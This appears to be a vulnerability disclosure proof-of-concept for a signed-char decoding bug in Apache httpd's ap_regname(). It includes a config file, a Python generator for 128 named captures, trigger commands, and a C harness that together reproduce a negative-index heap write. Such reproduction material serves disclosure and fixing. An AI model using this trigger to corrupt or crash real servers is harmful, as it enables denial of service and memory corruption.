# PoC 193 - Signed Nametable Decoding Permits Negative Captures

`ap_regname()` decodes a PCRE nametable capture number through signed `char`
operands; a high-bit byte sign-extends to a negative array index that is then
written through `((char **)names->elts)[capture]`.

## Setup

Apache built on a signed-`char` platform (default x86_64 Linux/macOS) with PCRE
or PCRE2 support. Minimal `httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule unixd_module     modules/mod_unixd.so
LoadModule authz_core_module modules/mod_authz_core.so

DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    Require all granted
</Directory>

# Force ap_pregcomp + ap_regname during config parsing.
# The regex contains 128 named captures so the last entry decodes to 0x00 0x80.
Include /tmp/many-names.conf
```

`/tmp/gen-conf.py` generates a 128-named-capture `LocationMatch`:

```python
#!/usr/bin/env python3
names = [f"(?P<n{i:03d}>x?)" for i in range(128)]
rx    = "^/" + "".join(names) + "$"
print(f'<LocationMatch "{rx}">\n    Require all granted\n</LocationMatch>')
```

```sh
mkdir -p /tmp/htdocs
python3 /tmp/gen-conf.py > /tmp/many-names.conf
```

## Trigger

```sh
# Configuration parse alone reaches ap_regname().
httpd -t -f /tmp/httpd.conf
# Or run under ASan/UBSan with -fsanitize=address,undefined
httpd -DFOREGROUND -f /tmp/httpd.conf
```

For a fast standalone reproduction without httpd, compile a harness that
mirrors the decode:

```sh
cat > /tmp/decode.c <<'EOF'
#include <stdio.h>
int main(void) {
    const char nt[2] = { 0x00, (char)0x80 };
    int capture = (nt[0] << 8) + nt[1];
    printf("capture = %d\n", capture);   /* expect -128 on signed-char */
    return 0;
}
EOF
cc -O0 /tmp/decode.c -o /tmp/decode && /tmp/decode
```

## Observed effect

- Standalone harness prints `capture = -128`, confirming signed promotion.
- Under ASan, the configuration parse aborts with a heap-buffer-underflow
  report at `((char **)names->elts)[-128] = ...` inside `ap_regname()`
  (`server/util_pcre.c:521`).
- Without ASan, the negative-index store silently corrupts heap metadata
  immediately before the APR array allocation; the daemon either crashes on
  the next allocator call or starts serving misrouted regex containers.
- Log marker: configuration test exits non-zero and ASan prints
  `WRITE of size 8 at 0x... is located ... bytes before ... region`.
